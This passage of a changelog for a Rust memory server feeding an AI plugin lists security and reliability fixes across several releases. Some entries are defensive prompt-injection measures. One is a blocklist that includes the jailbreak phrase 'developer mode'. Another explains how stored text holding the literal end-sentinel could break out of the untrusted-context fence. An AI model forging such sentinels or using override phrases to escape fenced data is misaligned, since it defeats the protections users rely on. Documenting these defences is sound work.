  Read (the file IS the domain). The `VACUUM INTO` path now goes through the
  shared quote-escaping primitive (S2-08/S2-24).
- **The rate limiter moved OUTSIDE the auth layers.** An unauthenticated
  flood is now 429-throttled before any token work — previously it
  401-rejected before ever consuming a bucket, and each free 401 performed a
  synchronous audit write on a fresh connection (unthrottled
  DB-write-per-request amplification). The deny-path audit writes now run on
  `spawn_blocking` (S3-03). Pinned by `rate_limit_layer_is_outside_auth_layers`.
- **`GET /graph/relationships/{id}/history` gates on `Action::Admin`**,
  matching what every doc surface (CHANGELOG §1.27.22, openapi.yaml,
  docs/api.md, its own doc comments) already claimed — the retired
  PII-bearing entity labels it returns are operator evidence. The read-audit
  failure is no longer silent (S3-02).
- **`/add` writes the quarantine flag IN-TX, before the commit** — a failed
  flag write now rolls the whole chunk back (the `/ingest/memory` posture)
  instead of leaving the injection chunk durably stored `flagged = 0` while
  telling the caller it failed (S3-06).
- **`/suggest` applies the v1.14 scope filter + v1.23 role gate** like
  `/recall` — an owner-restricted role no longer sees other owners\' private
  rows as suggestions (S2-29).
- **Security fixes:** Smaller hardening: `X-Forwarded-For` trusts the RIGHTMOST entry under
  `BRAIN_TRUST_PROXY=1` (leftmost is client-spoofable; S2-39); the rate
  limiter fails CLOSED on a poisoned lock (S2-50); the dead
  `"developer mode"` blocklist entry now matches (whitespace is stripped
  pre-match; S2-44); the audit-chain BEGIN-failure path bumps
  `audit_commit_failures` (it was silent; S3-09); the two boot-time
  `VACUUM INTO` literals go through the escaped primitive (S3-11).
- **The audit retention prune now VERIFIES before it prunes** and records a
  `retention` evidence row for what it deleted — previously the re-anchor
  would have re-blessed a tampered chain into a freshly-verifying one
  (evidence laundering), and the deletion of audit evidence was itself
  unevidenced. A failed re-anchor UPDATE now rolls the whole prune back
  instead of committing a half-rewritten chain (S2-16 + S2-35).
- **`verify_chain` enforces the NULL-prefix rule** (F-03, the no-hash-change
  half): a NULL `prev_hash` is legal only before the chain starts. Legitimate
  writers always chain from the tip once one exists, so a mid-chain NULL is
  tamper — previously it was skipped silently at any position. No stored hash
  changes.
- **`brain restore` re-applies ACTIVE legal holds** from the pre-restore DB
  and loudly discloses tombstoned content the backup resurrected — a pre-hold
  backup no longer silently unfreezes litigation-held ids, and an undone
  DSAR purge is on the record (S2-28).
- **The open-edge invariant is structural**: `idx_rels_open_unique` (partial
  UNIQUE on the triple `WHERE superseded_at IS NULL`, after a deterministic
  newest-wins dedup of legacy double-open rows) — a racing double-insert now
  fails at the DB and rolls back the ingest instead of corrupting the
  lineage (S3-08; schema → 1.27.25).
- **The remaining shim-mode reads are scoped**: `/decayed` + `/quarantine`
  bind the `X-Brain-Domain` label in SQL; `/stats` counts by domain label
  (entities/relationships via their chunk linkage); `/consolidate/propose`
  requires Admin in shim mode (its five detection scans are corpus-wide);
  the domain-registry `domain_invalid` error no longer embeds the
  `known_domains` inventory (S2-31/43/32).
- **Ingest auto-routing re-authorizes on the ACTUAL target** — a
  `write:<t>/global`-only principal can no longer contaminate another
  tenant's domain through centroid routing (S2-33).
- **`/clients` denies empty-grant auditors at the gate** (403, not a silent
  200-empty — "Some([]) denies all" now means the surface too; S2-15).
- **The DSAR certificate's remanence claim follows the pragma attempt** — on
  a failed `secure_delete=ON` it downgrades to the disclosed logical posture
  instead of certifying an overwrite that never ran (S2-18).
- **Chunker fidelity**: an UNTERMINATED oversized fenced block no longer
  duplicates its final code line into every stored piece (the last line was
  treated as a closer it wasn't); degenerate over-cap lines inside fences end
  with a newline so re-attached closers sit at line starts; prose pieces stay
  strict verbatim (S2-19/S2-20).
- **Evidence self-links are skipped** in the batched enrichment (a
  `from == to` row satisfied both `IN (…)` groups and duplicated into API
  responses; S2-38). **Domain delete now archives tombstones +
  evidence_links** into the pre-delete segment alongside the audit rows — the
  deletion registry is evidence and no longer dies with the domain (S2-21).
- **Plugin: `autoRecallGraph: false` disables the graph leg again.** The
  flag previously OMITTED the `graph` param when false, so the server\'s
  default-on change silently enabled the leg for every plugin user. The
  flag is now always sent explicitly; the plugin\'s documented default stays
  opt-in.
- **Improvements:** `openapi.yaml` `/health` + `/health/db` schemas now match the shipped
  shapes (the public probe is `{status, version}`; the detailed body is
  Read-gated on `/health/db`) — the contract previously documented the full
  fingerprint body on the public route. `SECURITY.md` egress inventory is
  truthful (three enumerated, bounded, opt-in/gated paths — not "exactly
  one").
### Engineering record

**M1 (S3-01, the headline):** `graph_retrieve(conn, query, k,
&SearchFilters)` — the chunk fetch composes `k.domain = ?` +
`push_gate_filters` (access_scope / owner / memory_kind / retention) with the
flagged clause, and the SELECT now carries `k.pii` into `SearchResult`
(previously `SearchResult::raw` hardcoded `pii: false` and the recall read
seam keyed redaction on that flag — graph hits were structurally
unredactable). One call site (`perform_search_traced` passes `&gfilters`);
UMP recall rides `run_recall` → the same path. PPR mass still flows through
shared entities in shim mode (ranking influence only — no content exposure;
the entity-name oracle remains the documented S2-41 ceiling).

**M2:** the `/get/{id}` idiom (label in SQL + row-domain re-auth +
`record_read_gate`) applied to `/verify`, `/ump/memory/{id}`,
`/procedure/{id}/steps`; `record_read_gate`/`role_retrieval_gate` resolved
once per request outside the blocking closures (the role gate opens a pool
connection — calling it inside a closure that holds one can deadlock a
size-1 pool).

**M3:** layer reorder + `spawn_blocking` deny-audit + source-inspection pin
(`rate_limit_layer_is_outside_auth_layers`, the F-44 layer-order
meta-test pattern — axum: the LAST `.layer()` is outermost, so the pin
asserts the registration order in `build_app`).

Tests: server bin **696** / 6 ignored (+7: the two graph-scoping pins, the
layer-order pin, the /verify + /ump domain pins, the NULL-prefix + prune-event
audit pins, the restore-holds pin, the chunker pins, the partial-index bite in
the schema contract), lib **136** / 1, brain 18, mcp 19, bench 5, eval 2,
metrics 8; clippy `-D warnings` + fmt clean; release build clean. Plugin: the
full openclaw extension suite ran green in the openclaw workspace — **145
passed** (144 + the new `autoRecallGraph` explicit-send pin), oxlint 0/0,
tsc + tsgo clean; the rebuilt dist bundle carries the fix.

Honest ceilings: the graph leg\'s PPR mass still crosses domains through
shared entity names in shim mode (ranking signal only — every emitted hit is
scoped); `/search`\'s `sources` filter does not constrain the graph leg
(ingest-kind filtering stays a vector/FTS capability); the audit chain
remains unkeyed/5-of-8-fields (F-03 — deferred to the audit-repair
milestone with S2-16/S2-35); restore-path legal holds remain deferred
(S2-28); `main.rs` grew (~+230 lines — three of the four pass-3 findings
lived in it).

---



## [1.27.24] — 2026-08-18

Server-only release (server `Cargo.toml`/lock `1.27.23` → **`1.27.24`**; client +
plugin unchanged). **"Brushed"** — the dead-code + fail-closed pass from the
lipstyk de-slop audit: remove the module-wide `#![allow(dead_code)]` escapes
that hid real dead code, and close the one genuine poisoning-control swallow the
sweep surfaced. No schema, no migration, no wire change, no telemetry.

### Release notes

- **Security fixes:** **A corrupt breach `jurisdictions` cell now fails the row read instead of
  silently becoming an empty list.** If the stored JSON on a breach was
  corrupted, the breach previously read back with zero affected jurisdictions —
  hiding from the DPO every affected-law notification deadline that the breach
  carries. That read now errors loudly (fail-closed, the repo's D-1 "never
  certify silence" invariant) rather than presenting an empty scope.
- **Bug fixes:** **Removed the blanket `#![allow(dead_code)]` + `#![allow(unused_imports)]`
  on the handlers module** and deleted the real dead code they were hiding
  (unused imports in `auth`, `recall`, `ump`, `govern`; the never-used
  `authorize_read_domain`; the never-read `ProposalRow.created_at`; the UMP
  recall `ranking_hints` request field, now `_ranking_hints` with its wire key
  preserved). No behavior change — clippy `-D warnings` is now the dead-code
  watchdog instead of a blanket allow.
### Engineering record

M5 removes the two module-wide allows the audit named. `handlers/mod.rs`:
removing the allow exposed genuinely-dead items, each deleted or repaired
(verify-by-reading, not blind-apply). `connector/mod.rs` keeps a **truthful**
allow: that module is the `brain-connector-gh` binary's library (auth, github
client, supervisor, translate pipeline) — it is not reachable from the server
runtime, but deleting it would remove a shipped, tested, feature-gated binary,
so it stays with an honest reason rather than the stale "stubs for future
versions" comment. M3 closes the one genuine poisoning-control swallow the
sweep surfaced (`breach::row_from` `serde_json` → `FromSqlConversionFailure`),
pinned by `row_decode_fails_closed_on_corrupt_jurisdictions`. Tests: server bin
**689** passed / 6 ignored (+1), lib **133** passed / 1 ignored; clippy
`-D warnings` clean on default + bench + otel; fmt clean; `connector-github`
feature still compiles. **Honest ceiling:** the lipstyk de-slop audit targeted
zero diagnostics; this release delivers the headline dead-code + fail-closed
items and **explicitly does not chase the residual heuristic hits**, the bulk of
which are false positives by inspection — `Option<String>`→`""` wire shapes on
DB-nullable columns (audit/recall serialization), best-effort cleanup paths
(`remove_file`/`ROLLBACK`/thread-join where `warn!` would be noise), legitimate
clones into owned containers/`Arc` handles/moved-into-`spawn_blocking` closures,
and the feature-gated connector library — and a blind sweep to force "zero"
would risk behavior changes the hard rule forbids. The genuine error-swallowing
class (a failure meaning a control silently didn't run) was already swept in
v1.27.19 and is closed here for the breach read. Rollback is per-file and
semantics-free.

---



## [1.27.23] — 2026-08-18

Server-only release (server `Cargo.toml`/lock `1.27.22` → **`1.27.23`**; client +
plugin unchanged). **"Medicate"** — the three security findings the adversarial
pass surfaced as still-open, delivered as small, behavior-gated hardening: no
new schema, no new endpoints, no wire change, no telemetry. Two landed here
(health surface reduction + fail-closed embed errors); the third (the bounded
outbound client) was already shipped in v1.27.21 (M9: 5 s connect / 15 s total
egress bound) and is re-verified, not re-built.

### Release notes

- **Public `/health` is now the minimal probe shape.** The unauthenticated
  load-balancer probe shows only `status` + `version`; every
  deployment-fingerprinting field (`model`, `otel.endpoint`, `pool`, `backup`,
  `webhook`, `hardening`, `compliance.dpo_contact`, `integrity`) moved behind
  the authenticated `/health/db` detail. Operator monitors must switch to the
  gated detail.
- **HTTP/2 dependency hardened (h2 0.4.16).** Clears RUSTSEC-2026-0258
  ("unbounded empty DATA frames") on the reqwest/hyper client; `cargo audit` is
  clean on both trees.
- **Silent embedding failures are now loud.** If a neural embedder fails to
  load, the server emits a warning instead of quietly returning an empty vector
  (which callers already skip) — no more silent retrieval gaps.
### Security fixes

- **Public `/health` is now the minimal probe shape (A-02).** The load-balancer
  probe (`status` + `version`) stays public; every deployment-fingerprinting
  field — `model`, `otel.endpoint`, `pool`, `backup`, `webhook`, `hardening`,
  `compliance.dpo_contact`, `integrity` — moved behind the existing Read gate on
  `/health/db`. An unauthenticated network probe can no longer fingerprint a
  regulated BPO deployment. **Intentional surface reduction** (same class as the
  v1.20.2 F2 carve-out): an operator monitor reading the detailed fields must
  switch to the gated `/health/db`.
- **Dependency hardening: h2 0.4.15 → 0.4.16 (RUSTSEC-2026-0258).** The HTTP/2
  dependency (reached via the reqwest/hyper client) was bumped to clear the
  "unbounded empty DATA frames" advisory. `cargo audit` returns exit 0 on both
  the server and client trees; the two remaining findings are `unmaintained`
  *warnings* (paste, number_prefix) deep in the HF tokenizers/model2vec stack —
  not vulnerabilities, and not clearable without a major bump.

### Bug fixes

- **Embed failures are no longer silent (A-03).** The feature-gated neural
  embedders (`bge-m3` / `gte-base-en-v1.5`) logged nothing when the model
  failed, returning an empty vector the callers silently skipped. Every failure
  branch now emits a `warn!` (the D-1 "never certify silence" invariant the repo
  enforces on the audit settle, quarantine flag, and purge residues). Behavior
  is otherwise unchanged: callers already skip the row on an empty vector, so no
  corrupt zero-length embedding was ever written — this closes only the missing
  signal, not the guard.

### Engineering record

M1 egress bound was already shipped (v1.27.21 M9) — no new work. M2 reuses the
existing `/health/db` Read gate + the pure `health_body` builder (no new route,
no dead code: the builder stays the detailed body used by the gated route).
M3 is the minimal fail-closed signal on the two neural failure branches. Tests:
server bin **688** passed / 6 ignored (+2: `public_health_is_minimal`,
`detailed_health_requires_admin`), lib **133** passed / 1 ignored; clippy
`-D warnings` + fmt clean; route-authz + openapi guard tables unchanged (no new
routes, no openapi response change). Honest ceilings: `/health` shrinking is the
intended behavior change — public monitors must move to the gated detail; the
neural warn path is reachable only under `--features neural-embed`
(enterprise/desktop — the default edge static model is infallible); an embed
failure still returns an empty vector that the caller skips — it is now loud,
not silent; `compliance.dpo_contact` stays on the Read-gated detail (the privacy
notice remains the public subject-contact channel). Rollback is trivial: revert
M2 to restore the old public body, or M3 to return to the silent-empty behavior.

---



## [1.27.22] — 2026-08-18


Server-only release (server `Cargo.toml`/lock `1.27.21` → **`1.27.22`**; client +
plugin unchanged). **"Cascade"** — a bug-fix release closing two
*documented-but-unimplemented* behaviors in the graph edge layer: edge
supersession was write-once (nothing ever closed an old edge's `invalid_at` when
reality changed) and traversal claimed to skip superseded edges but never did.
This release makes the code true to its own documentation, reusing the
bi-temporal columns + hash-chained audit + quarantine machinery already shipped.
No new storage, no new schema columns/tables, no wire change, no telemetry; the
schema stamp advances to **1.27.22** for the added `relationships.superseded_at`
column + index swap.

### Bug fixes

- **Edge supersession is now wired (BUG-1).** The ingest path replaced its
  write-once `INSERT OR IGNORE` with a pure bi-temporal resolver
  (`resolve_edge_insert`). Re-ingesting an *unchanged* relation is still an
  idempotent no-op (no history churn); re-ingesting a relation with a *changed*
  window/interval now retires the old edge version (`superseded_at` = the
  transaction-time end, old row preserved verbatim) and inserts the corrected
  version as the new current belief. The handoff is exact:
  `old.superseded_at == new.created_at`.
- **Traversal now skips superseded edges (BUG-2), matching its own doc.** The
  recursive walk filters edges to *current beliefs*: live (`superseded_at IS
  NULL`) and the newest live version of their `(from, to, relation_type)`
  triple. This is a no-op on well-formed/legacy DBs (a lone edge has no newer
  live peer), so default recall/traversal output is byte-identical; it corrects
  the case where a backdated supersession previously returned two edges claiming
  the same triple at one instant.
- **`/graph/relationships/{id}/history` (Admin, audited).** A new read surface
  reconstructs the full version history of an edge triple — every version in
  order with its four timestamps (`valid_at`, `invalid_at`, `created_at`,
  `superseded_at`) + a `current` flag — given any one version id, so a
  superseded belief can always be recovered (supersession never deletes).
- **Superseded edges are hidden from graph + adjacency reads.** `GET
  /graph/relations`, `entity_relations`, `relations_for`, the UMP relation
  fan-out, and the graph-PPR adjacency aggregation all filter to current
  beliefs, so a retired edge no longer surfaces as a live relation.

### Improvements

- Supersession events ride the existing hash-chained audit log
  (`AuditKind::Ingest`, detail `created:<id>` / `superseded:<old_id>->:<new_id>`)
  and the history-surface read is itself recorded (`AuditKind::GraphRead`).
- Fail-closed: an inability to resolve an edge insert declines the ingest
  transaction (never a silent half-write); an unresolvable history id returns
  `404 Relationship not found`.

### Security fixes

- None (no new trust boundary; the graph-label read seam posture is unchanged
  from v1.27.21).

### Engineering record

- New lib module `graph_supersede` (pure `resolve_edge_insert` +
  `EdgeAction::{SameWindow, Created, Superseded}`, unit-tested with a bare
  `Connection`), wired from `ingest.rs`; migration adds `superseded_at` and swaps
  the write-once UNIQUE index for the plain `idx_rels_bt` (schema **1.27.22**).
- Tests: server bin **686** / 6 ignored (was 685; +1 `edge_history`), lib **133**
  (incl. 5 `graph_supersede`), graph `superseded_edges_are_not_counted_in_adjacency`,
  `traversal_skips_superseded_edge`, `traversal_keeps_oldest_edge_when_no_later_same_typed`,
  `graph_read_surfaces_hide_superseded_edges`; clippy `-D warnings` + fmt clean.
- Recall gate green on the new build: `brain eval --floor r5=0.85,r10=0.85,mrr=0.85`
  over the frozen 37-query 10-doc smoke corpus → r@5 0.919 / r@10 0.919 /
  mrr 0.905 / ndcg@10 0.909, exit 0 (see `BENCHMARKS.md`).
- Honest ceilings: edge supersession is deterministic on the temporal interval,
  not LLM-judged (semantic contradictions like "now trust X, still respect Y"
  stay out of scope); history is the versioned edge rows, not a per-field audit
  diff; this is a correctness/doc-truth fix, not a recall-quality claim —
  LongMemEval parity stays `PENDING`. Rollback is minimal: supersession only
  *sets* `superseded_at` (never destructively mutates), so reverting M1/M2
  restores the old no-op write path; leftover `superseded:` audit rows are
  harmless evidence. Verify `brain doctor` post-install (first boot since
  v1.27.21 runs the idempotent migration).
  See `IMPLEMENTATION_PLAN_v1.27.22_Cascade.md`.

---



## [1.27.21] — 2026-08-18

Server + client + plugin release (server `Cargo.toml`/lock `1.27.20` → **`1.27.21`**;
client `1.27.20` → **`1.27.21`**; plugin **0.4.4 → 0.4.5**). The complete
hardening pass — fail-closed erasure + fence-forgeability close, the class the
pass-2 audit rates CRITICAL when an unfenced erasure seam or a forgeable
untrusted region diverges. No new schema, no new columns/tables, no telemetry;
the one wire change is the deliberately-bit-stable **backup v3** writer.

### Release notes

- **Legal-hold fence closed on two erasure paths (S2-03 CRIT / S2-04).** A held
  chunk was frozen against `/purge`, DSAR and `forget` — but `POST
  /ump/forget {"hard":true}` (reachable at Write scope via the MCP `ump.forget`
  tool) and the ingest-replace/vault sweep bypassed the fence and could erase
  it. Both now run `refuse_if_held` in-tx → `409 legal_hold_active`, all-or-
  nothing.
- **Fence-forgeability close (S2-02).** A stored body containing the literal
  `=== BRAIN_UNTRUSTED_CONTEXT END ===` (or BEGIN) would close the untrusted
  region early. The shared `strip_sentinels` primitive now removes both
  literals before wrapping on every seam (MCP `tool_result_payload` +
  `format_response`, and the plugin's recall banner), ordered invisible-strip
  first so a zero-width split cannot re-heal a marker into the fence.
- **Backup v3 header bound as GCM AAD + KDF bounds (S2-13 / S2-14).** The v2
  header was not covered by the GCM tag — any header bit could be flipped
  without failing authentication. v3 (same byte layout, `brain backup` now
  defaults to `v3`) binds the exact header bytes as GCM AAD, and
  `validate_kdf_params` bounds attacker-controlled Argon2id params before any
  allocation (m 8 MiB..1 GiB, t 1..=64, p 1..=8) so a crafted `m = u32::MAX`
  errors (`kdf_params_out_of_range`) instead of OOMing. `brain backup` accepts
  `v1|v2|v3`; legacy v1/v2 files keep their read paths.
- **Auth fail-closed (F-27 class).** A single-team wildcard `read:<team>/*` now
  grants only the shared `global` pool, never every tenant's named domain (a
  flat domain namespace means the team field can never narrow a `*` domain
  grant — naming a domain requires naming it); and a token with **no roles**
  passes `require_dpo_role` only when the deployment defines no roles at all,
  closing the single-token shape that could ride a bare admin scope.
- **Empty reconcile is an explicit decision (S2/N1).** An empty `live_uris`
  previously retired **every** active vault source and swept its chunks,
  indistinguishable from a failed listing. It now 400s `live_set_empty` unless
  the caller sets `allow_empty: true`; the client panel waives it only through
  the shared two-step confirm.
- **Client offline-queue integrity (N5–N8).** Retry-park (a persisted counter
  parks an auto-replay after 5 failures instead of refiring forever;
  destructive actions always park); idempotency key normalizes the volatile
  fields out so a re-enqueue collapses onto its twin; the persisted DSAR
  subject hash is now `SHA-256(salt ‖ subject)` with a per-install salt
  (defeats precomputed/rainbow tables, legacy items decode via the empty-salt
  form); and the purge **owner** is persisted so an owner-scoped purge no
  longer replays as an empty no-op body that silently erased nothing.
- **Replay drift (N9/N13).** Char-boundary-safe `hash_prefix` (a corrupt stored
  hash truncates on char boundaries) and `kept_set` drift detection vs the
  parent catch same-length row swaps.
- **Fence sentinel in the plugin (M7).** The plugin resolves its bearer via the
  env ladder `BRAIN_TOKEN_FILE` → `BRAIN_TOKEN` → config, never writes a token,
  and its per-turn abstention log logs the **query length only** (a recall query
  is user text and openclaw's log is persistent) — see the plugin 0.4.5
  CHANGELOG.
- **Webhook egress bound.** The egress client now enforces a 5 s connect / 15 s
  total timeout so a hung sink cannot stall the request path.
### Engineering record

Tests: server lib **128** / 1 ignored, main bin **674** / 6 ignored, brain
**18**, mcp **19**, bench **5**, eval **2**, metrics **8**; client 140 →
**152**; clippy `-D warnings` + fmt clean on both trees (server default +
`bench`; the three client gate failures found during the pass —
`&mut Vec`→slice, unnecessary slice-clone, and a grep-guard that matched its
own assertion literal — are fixed with new pins); wasm release build
**5.3 MB** (budget 7). Plugin 0.4.5 green on the openclaw tree (144 vitest +
oxlint + tsc). Honest ceilings: backup v3 AAD binds header bytes at write/read
time — it does not migrate or re-anchor existing v2 `.bak` files (they stay
readable via the v2 no-AAD path); the legal-hold fences are read-time
enforcement over stored rows (a write that stores a wrong label is out of
scope); N7's salt sits in the same localStorage as the hash — it is uniqueness,
not secrecy; the role-empty gate is governance narrowing — a deployment that
defines roles but issues scope-only tokens sees those surfaces denied until
roles are granted. F-09/S2-28 (restore-path audit-chain verification + legal-
hold/tombstone reapply) is deliberately deferred to the audit-repair milestone.
See `IMPLEMENTATION_PLAN_v1.27.21_Finish.md`.

---



## [1.27.20] — 2026-08-17

### Improvements — "Console"

Client + CLI release (server `Cargo.toml`/lock `1.27.19` → **`1.27.20`**;
client `1.27.19` → **`1.27.20`**; plugin unchanged at 0.4.4). The operator
surfaces meet the 2026 bar: honest i18n, honest states, machine-parseable
CLI, and help that cannot drift. No server endpoints, no schema change, no
telemetry. **M3 the i18n truth (F-38):** the five locale bundles now expose
one identical key set (pinned by the parity wall), every render surface
(main chrome, command palette, review queue, recall, security, health,
register, graph, subjects, ops, audit, data, system, ump, ingest, procedures,
consolidate, the shared confirm) resolves labels through `t()`/`t_fmt()` — a
new `no_raw_strings_in_rsx` source-scan test gates future work with an
explicit `// i18n-exempt: <reason>` escape; the keyboard-shortcuts label
gained the missing `E` (edit) key. **F-36** the client's shared HTTP client
carries the CLI's socket discipline (5s handshake / 15s total — a hung backend
surfaces as `ApiError::Network` instead of a panel spinning forever); the
builder methods are native-only, the wasm target keeps the plain client
(browser fetch owns its own timeouts — verified by the client-gate wasm
build). **M4 the CLI (F-37):** `--json` envelope
mode (`{"ok":true,"cmd":…,"data":…}` / `{"ok":false,…,"error":{"code":…}}`)
for every data command (query, explain, get, ingest-dir, suggest,
suggest-metrics, retention, snapshot-status, connector-status, status, eval)
with documented exit codes (0 ok · 1 runtime · 2 usage); the flag parser
learns its vocabulary — boolean flags (`--dry-run`, `--yes`, `--force`,
`--json`, …) never swallow the next token (`ingest-dir --dry-run ~/vault`
finally works), unknown flags exit 2, `--` ends flag parsing, and `--k abc`
exits 2 with "must be an integer" instead of silently becoming 5; `ingest-dir`
exits non-zero when every file failed (code `all_files_failed`); `status`
renders `-1` sentinels as `n/a`; help is generated from the one subcommand
table the dispatcher uses (the flush-left `brain client add` survivor line is
gone, `brain token rotate` + `brain ump …` were missing and are now listed,
and a `flags:`/`exit codes:` section documents the contract); `brain suggest`
output runs the same strip chain as recall/get (markdown-ref + invisible +
control-char parity).

### Bug fixes

- `brain ingest-dir --dry-run <path>` treated the path as the flag's value and
  ingested nothing; `--k abc` silently coerced to 5; unknown `--flag` was
  swallowed instead of refused; `brain status` printed `-1` for absent
  counters; `brain client add` rendered flush-left in help.

### Release notes

- **Every label in the app now resolves through the translation layer.**
  The five locale bundles (en/de/fr/es/nl) expose one identical key set, and
  every render surface — main chrome, command palette, review queue, recall,
  security, health, register, graph, subjects, ops, audit, data, system, ump,
  ingest, procedures, consolidate, the shared confirm — resolves its labels
  through `t()`/`t_fmt()` instead of hard-coded strings. A new source-scan
  test gates future work so a raw string can't silently leak back into the
  UI. The keyboard-shortcuts help also gained the missing `E` (edit) key.
- **A hung backend can no longer spin a panel forever.** The client's shared
  HTTP client carries the CLI's socket discipline (5s handshake / 15s total),
  so a backend that stops answering surfaces as a network error instead of an
  endlessly-loading panel. (The browser/wasm build keeps its own fetch
  timeouts.)
- **The CLI's `--json` envelope mode is here.** `query`, `explain`, `get`,
  `ingest-dir`, `suggest`, `suggest-metrics`, `retention`, `snapshot-status`,
  `connector-status`, `status`, and `eval` all emit a machine-parseable
  `{"ok":…,"cmd":…,"data":…}` envelope with documented exit codes (0 ok ·
  1 runtime · 2 usage).
- **Flag parsing is honest.** Boolean flags (`--dry-run`, `--yes`, `--force`,
  `--json`, …) never swallow the next token, so `ingest-dir --dry-run
  ~/vault` finally works. Unknown flags exit 2 instead of being silently
  swallowed, `--` ends flag parsing, and a bad value like `--k abc` exits 2
  with a clear message instead of silently becoming 5. `ingest-dir` exits
  non-zero when every file failed. `status` renders absent counters as `n/a`.
- **`brain --help` cannot drift.** Help is generated from the same subcommand
  table the dispatcher uses — the orphaned `brain client add` line is gone,
  `brain token rotate` and `brain ump …` are now listed, and a
  `flags:`/`exit codes:` section documents the contract. `brain suggest`
  output also runs the same cleanup chain as recall/get.
- **Bug fixes:** `brain ingest-dir --dry-run <path>` previously swallowed the path as the
  flag's value and ingested nothing.
- **Bug fixes:** `--k abc` silently coerced to `5`; unknown `--flag` values were swallowed
  instead of refused.
- **Bug fixes:** `brain status` printed `-1` for absent counters.
- **Bug fixes:** `brain client add` rendered flush-left in help output.
### Engineering record

Tests: server main bin **670** / 6 ignored (unchanged count — the CLI bin grew
12 → **18** with the flag-vocabulary + help-truth tests); lib 126 / 1; client
140 → **143** (+ the parity wall stays, + `no_raw_strings_in_rsx` and its
scanner unit tests); clippy `-D warnings` + fmt clean on both trees; `brain
--help` diff reviewed line-by-line (only the intended lines move); live smoke
green: `ingest-dir --dry-run` 136 simulated, `--json query/status/
snapshot-status/suggest-metrics/get` envelopes, `--k abc` exit 2, unknown
subcommand/flag exit 2, `setup --json` refused with exit 2. Honest ceilings:
`--json` covers the data commands — interactive flows (setup, client, token,
key, backup/restore, doctor, reconcile, sync, connect) refuse it loudly
(exit 2) rather than pretend; the flag vocabulary is a fixed list (a new flag
must be added there + in help, both single-sourced); the `no_raw_strings_in_rsx`
scan skips prop values (`placeholder:`) by design — the visible placeholders
are keyed but the rule itself targets labels; modal focus-trapping, the
digest display, deep-link states and the render-path fetch fix shipped with
their tests in earlier v1.27.x work and are re-verified here. See
`IMPLEMENTATION_PLAN_v1.27.20_Console.md`.

---



## [1.27.19] — 2026-08-16

### Security — "Scrub"

Server + client release (server `Cargo.toml`/lock `1.27.18` → **`1.27.19`**;
client `1.27.15` → **`1.27.19`**; plugin unchanged at 0.4.4). The silent-
failure pass: every write-path `let _ =`, the auth denylist's 204-always lie,
the best-effort audit settle, and every client action whose outcome was
dropped on the floor — plus the prompt-injection screen hoisted out of the
per-query hot loop. No new endpoints, no wire changes, no schema change, no
telemetry.

### Release notes

- **A failed logout/revoke no longer says 204 "done".** `POST /auth/logout`
  and `POST /auth/revoke` wrote the token to the revocation denylist
  best-effort and returned success regardless — an operator logging out
  believed the token was dead when a failed INSERT left it live for its full
  15-minute shelf life (and a revoked token could be refreshed). Both now
  surface a denylist write failure as `500 revoke_failed`; success still
  means the token is really dead.
- **Purge residue deletes propagate (were `let _ =`).** A chunk purge deleted
  the tombstoned row's relationships / vec0 embedding / evidence links /
  traces in silence — one failing DELETE while the rest succeeded left a
  partial erasure that the purge then certified complete. Every residue
  delete now participates in the purge transaction: a failure rolls the whole
  purge back instead of certifying a lie.
- **Security fixes:** **The prompt-injection blocklist screen runs once per hit, not per
  consumer.** Recall constructed each `SearchResult` with raw bytes, then the
  PRF query-expansion extractors re-normalized each hit's content against the
  blocklist per query. The screen now runs once at construction and rides as
  an internal `blocklist_hit` flag (never serialized); both extractors read
  the flag. Behavior-identical, one scan saved per hit per query.
- **Erasure hygiene warns instead of certifying silence.** The DSAR/shared
  purge previously swallowed a failed `PRAGMA secure_delete=ON` or a failed
  `wal_checkpoint(TRUNCATE)` — the two operations that ensure erased page
  images don't survive in the WAL or freelist. Failures are now logged loudly
  instead of whispering "erased".
- **Audit-settle failures are visible.** The best-effort audit-chain settle
  (COMMIT/ROLLBACK of the chained row) could fail under a busy writer — the
  caller still got a row id, and nothing said the chain might have missed it.
  `/health`'s `hardening` block now carries a monotonic `audit_commit_failures`
  counter (0 = green; >0 = rows possibly off the durable chain).
- **Every other write-path `let _ =` residue propagated** (23 further sites):
  chunk stored without its evidence links, stale vec0 rows surviving reindex,
  webhook seen-writes, retention prunes, refresh failures, orphaned PII
  residues, secure_delete/TRUNCATE on purge — each now either fails the
  operation or warns with context.
- **Client decisions announce their outcome.** A failed approve/reject in the
  Operations queue, a failed quartine release/delete in Security, and failed
  decayed/tombstone loads in the Data panel were silently dropped — each now
  renders an `aria-live` status line (was `let _ =` on the result, or `if let
  Ok` on the load).
- **A single-record ingest lost its last panic.** The singleton UMP path
  lowered a one-element batch with `.next().unwrap()` behind a length guard;
  it is now a `pop()` + `?` — no panic fallback left on the write path.
- **Dead "reserved" trace vocabulary removed.** `trace.rs` shipped an
  `#[allow(dead_code)]` `update:`/`supersedes:`/`contradicts:`/`causes:`
  prefix vocabulary "reserved for v1.6 Reconcile"; v1.6 shipped and closed
  without consuming it. The dead constants and their tests are gone — the
  used surface (`MAX_HOPS`/`MAX_VISITED` traversal caps) is unchanged.
### Engineering record

- **D-8 pinned**: `blocklist_flag_one_shot_at_construction_and_consumed`
  (flag = `raw()`'s screen; the extractors consume the flag — a flag-only hit
  is excluded even with clean bytes) + `prf_skips_injection_flagged_content`
  re-routed through `raw()` so the negative-feedback guardrail exercises the
  production construction seam.
- **F-54 pinned**: `revoke_reports_failure` proves a failing denylist write
  surfaces `500 revoke_failed` (`AuthHandlerError`) instead of a lying 204.
- **D-1 purge-integrity pinned** by the residue-delete propagation tests in
  the purge/DSAR suite (a failing residue rolls back the whole purge).
- Tests: server bin **670** / 6 ignored, lib **126** / 1 ignored, brain 12,
  mcp 17, bench 8, client **132**; clippy `-D warnings` + fmt clean on both
  trees; `badges.sh --selfcheck` clean.
- Honest ceilings: `audit_commit_failures` reports, it does not retry (the
  settle is best-effort by design); the blocklist flag is a construction-time
  snapshot — content is immutable after construction in every path (fusion
  clones verbatim), so the flag cannot drift; the client status lines are
  per-action announcements, not an action log (server-side per-action history
  remains v2.x); the purge hygiene is a warn, not a retry loop. See
  `docs/AGENTS_HISTORY.md` for the audit trail.

---



## [1.27.18] — 2026-08-16

### Performance — "Groundwork"

Server-only release (server `Cargo.toml`/lock `1.27.17` → **`1.27.18`**; client
+ plugin unchanged at 1.27.15 / 0.4.4). The read-path cost pass: PRF term
expansion, evidence enrichment, the search filter plumbing, and the release
binary itself get their honest perf treatment — and the audit that motivated
them surfaced that the FTS-vocabulary PRF weighting (shipped v0.9.1) **never
actually ran**: the bundled SQLite's `fts5vocab` instance table exposes
